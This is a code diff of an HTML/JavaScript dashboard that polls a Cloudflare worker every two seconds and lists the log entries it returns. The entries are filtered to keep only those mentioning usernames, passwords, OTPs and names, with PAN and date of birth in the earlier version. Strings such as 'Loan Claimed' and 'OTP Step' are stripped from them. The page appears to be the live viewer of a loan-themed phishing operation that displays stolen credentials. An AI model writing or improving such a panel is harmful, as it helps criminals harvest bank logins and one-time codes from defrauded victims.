@@ -13,78 +13,64 @@
             display: flex; justify-content: space-between; align-items: center;
             border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,0.1);
         }
-        .status-text { font-size: 11px; color: #00a859; font-weight: bold; }
         #count { color: #ff0000; font-size: 28px; font-weight: 900; }
-
-        #logsContainer { width: 100%; display: flex; flex-direction: column; }
 
         .log-card { 
             margin-bottom: 10px; padding: 15px; 
             border-radius: 10px; width: 100%; display: flex; flex-direction: column;
-            box-shadow: 0 4px 6px rgba(0,0,0,0.15);
         }
 
         /* Black & White Alternate Theme */
-        .log-card:nth-child(odd) {
-            background-color: #ffffff;
-            border-left: 5px solid #000;
-        }
-        .log-card:nth-child(odd) .detail-text { color: #000000; }
-
-        .log-card:nth-child(even) {
-            background-color: #1a1a1a;
-            border-left: 5px solid #ff0000;
-        }
-        .log-card:nth-child(even) .detail-text { color: #ffffff; }
+        .log-card:nth-child(odd) { background-color: #ffffff; color: #000; border: 1px solid #ddd; }
+        .log-card:nth-child(even) { background-color: #000000; color: #fff; }
 
         .detail-text { 
-            font-size: 15px; font-weight: 600; white-space: pre-wrap; 
+            font-size: 16px; font-weight: bold; white-space: pre-wrap; 
             line-height: 1.8; word-break: break-all;
         }
 
         .time-footer { 
             display: block; margin-top: 10px; font-size: 10px; 
-            color: #ff4d4d; text-align: right; font-weight: bold;
-            opacity: 0.8;
+            color: #ff4d4d; text-align: right;
         }
-
-        .loading { font-size: 13px; color: #666; text-align: center; margin-top: 50px; }
     </style>
 </head>
 <body>
 
     <div class="header">
-        <span class="status-text">● LIVE_DATA_FEED</span>
+        <span style="font-size: 12px; color: green; font-weight: bold;">● LIVE_FEED</span>
         <span id="count">0</span>
     </div>
 
-    <div id="logsContainer">
-        <p class="loading">Fetching data from worker...</p>
-    </div>
+    <div id="logsContainer"></div>
 
     <script>
         const workerURL = 'https://flat-fog-a0cd.sumankkuuyy.workers.dev/';
 
-        // Data ko "Label:- Value" format mein saaf karne ka function
         function formatData(text) {
-            if (!text) return "";
-            return text
+            if (!text) return "No Detail";
+            
+            // Sabse pehle faltu words saaf karein
+            let clean = text
                 .replace(/Type:[^|]*/gi, "")
                 .replace(/Path:[^|]*/gi, "")
                 .replace(/Loan Claimed/gi, "")
                 .replace(/OTP Step \d+/gi, "")
-                .split('|') // Pipe se alag karein
-                .map(item => item.trim())
-                .filter(item => item.length > 0)
-                .map(item => {
-                    // Yahan logic hai "Label:- Value" dikhane ka
-                    if(item.includes(':')) {
-                        let parts = item.split(':');
-                        return parts[0].trim() + ":- " + parts[1].trim();
-                    }
-                    return item;
-                })
-                .join('\n'); // Har info nayi line mein
+                .trim();
+
+            // Pipe (|) ko break karke line banayein
+            let lines = clean.split('|').map(s => s.trim()).filter(s => s !== "");
+            
+            // Format check: Label aur Value ko " :- " se jodein
+            return lines.map(line => {
+                if (line.includes(':')) {
+                    let parts = line.split(':');
+                    let key = parts[0].trim();
+                    let val = parts.slice(1).join(':').trim(); // handle multiple colons
+                    return `${key}:- ${val}`;
+                }
+                return line;
+            }).join('\n');
         }
 
         async function fetchLogs() {
@@ -93,37 +79,33 @@
                 const data = await response.json();
                 const container = document.getElementById('logsContainer');
                 
+                // Sirf kaam ka data filter karein
                 const filteredData = data.filter(item => {
                     const d = item.detail.toLowerCase();
-                    return d.includes("user") || d.includes("pass") || d.includes("otp") || 
-                           d.includes("pan") || d.includes("dob") || d.includes("name");
-                });
+                    return d.includes("user") || d.includes("pass") || d.includes("otp") || d.includes("name");
+                }).reverse();
 
-                // New entry top par dikhane ke liye reverse
-                const sortedData = filteredData.reverse();
-                document.getElementById('count').innerText = sortedData.length;
+                document.getElementById('count').innerText = filteredData.length;
 
-                if (sortedData.length === 0) {
-                    container.innerHTML = "<p class='loading'>No data found. Waiting...</p>";
+                if (filteredData.length === 0) {
+                    container.innerHTML = "<p style='text-align:center; padding-top:20px;'>Data load ho raha hai...</p>";
                     return;
                 }
 
-                container.innerHTML = sortedData.map(item => {
-                    const cleanDetail = formatData(item.detail);
+                container.innerHTML = filteredData.map(item => {
                     return `
                         <div class="log-card">
-                            <div class="detail-text">${cleanDetail}</div>
+                            <div class="detail-text">${formatData(item.detail)}</div>
                             <span class="time-footer">${item.time}</span>
                         </div>
                     `;
                 }).join('');
 
             } catch (err) {
-                console.log("Worker offline or error");
+                console.error("Fetch Error");
             }
         }
 
-        // 2 second mein auto-update
         setInterval(fetchLogs, 2000);
         window.onload = fetchLogs;
     </script>
